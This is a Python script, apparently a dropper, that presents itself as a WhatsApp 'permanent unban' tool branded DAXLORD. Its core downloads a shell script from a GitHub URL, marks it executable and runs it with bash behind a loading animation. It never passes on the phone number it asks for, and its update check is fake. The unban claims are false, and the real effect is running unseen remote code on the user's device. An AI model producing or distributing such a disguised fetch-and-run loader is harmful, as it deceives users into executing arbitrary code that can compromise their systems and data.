import os
import sys
import subprocess
import time
import requests
import platform

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """
╔══════════════════════════════════════════════════════════════╗
║                   WhatsApp Unban Permanent Tool              ║
║                   𖣘 DAXLORD ™ 𖣘 v1.0                        ║
╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)

def download_sh_file():
    """Download the .sh script from GitHub"""
    sh_url = "https://raw.githubusercontent.com/LORD-DAX1010101/Unban/main/unban.sh"  # ← Change this URL
    local_sh_path = "unban.sh"
    
    if os.path.exists(local_sh_path):
        print("✅ Unban script found locally")
        return local_sh_path
    
    print("📥 Downloading unban script from Dax core...")
    try:
        response = requests.get(sh_url, stream=True)
        response.raise_for_status()
        
        with open(local_sh_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        # Make it executable (important!)
        os.chmod(local_sh_path, 0o755)
        print("✅ Unban script downloaded and made executable!")
        return local_sh_path
        
    except Exception as e:
        print(f"❌ Failed to download script: {e}")
        return None

def execute_sh_file(sh_path, phone_number):
    """Execute the .sh script using bash"""
    if not os.path.exists(sh_path):
        print("❌ Script file not found!")
        return False
    
    try:
        print(f"🚀 Launching unban script...")
        print("⏳ Please wait patiently 😊...")

        # Run with bash (works on Termux, Linux, macOS, WSL)
        process = subprocess.Popen(
            ["bash", sh_path],                   # ← This is the main change
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        # Fancy loading animation
        animation = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        for i in range(30):
            print(f"\r{animation[i % len(animation)]} Processing your request...", end="")
            time.sleep(0.15)
        
        stdout, stderr = process.communicate()
        
        print("\r✅ Execution finished!                         ")

        if process.returncode == 0:
            print("✅ Unban request sent successfully!")
            if stdout.strip():
                print(f"📄 Result:\n{stdout.strip()}")
            return True
        else:
            print("❌ Script execution failed!")
            if stderr.strip():
                print(f"💬 Error: {stderr.strip()}")
            return False

    except Exception as e:
        print(f"❌ Execution error: {e}")
        return False

def unban_permanent():
    clear_screen()
    print_banner()
    
    print("🛠️  Permanent Unban Service")
    print("=" * 50)
    
    sh_path = download_sh_file()
    if not sh_path:
        input("\nPress Enter to go back...")
        return
    
    print("\n📝 Enter target information:")
    phone_number = input("WhatsApp number (with country code): ").strip()
    
    if not phone_number or not phone_number.replace('+', '').replace(' ', '').isdigit():
        print("❌ Invalid or empty phone number!")
        input("\nPress Enter to continue...")
        return
    
    print(f"\n📞 Target: {phone_number}")
    print(f"🔧 Script: {os.path.basename(sh_path)}")
    
    confirm = input("\n⚠️  Start unban process? (y/N): ").strip().lower()
    if confirm not in ['y', 'yes']:
        print("❌ Operation cancelled!")
        input("\nPress Enter to continue...")
        return
    
    print("\n" + "=" * 50)
    success = execute_sh_file(sh_path, phone_number)
    print("=" * 50)
    
    if success:
        print(f"\n✅ Unban process started for {phone_number}")
        print("⏰ Wait 24–48 hours for WhatsApp to review")
    else:
        print(f"\n❌ Failed to process {phone_number}")
    
    input("\nPress Enter to continue...")

def check_updates():
    print("🔍 Checking for updates...")
    print("✅ You are using the latest version!")
    input("\nPress Enter to continue...")

def main():
    while True:
        clear_screen()
        print_banner()
        
        print("📱 Main Menu")
        print("=" * 50)
        print("[1] Unban Permanent")
        print("[2] Check for Updates")
        print("[0] Exit")
        print("=" * 50)
        
        choice = input("\nSelect option: ").strip()
        
        if choice == '1':
            unban_permanent()
        elif choice == '2':
            check_updates()
        elif choice == '0':
            print("\n👋 Thanks for using DAXLORD Unban Tool!")
            break
        else:
            print("❌ Invalid choice!")
            time.sleep(1.5)

if __name__ == "__main__":
    main()
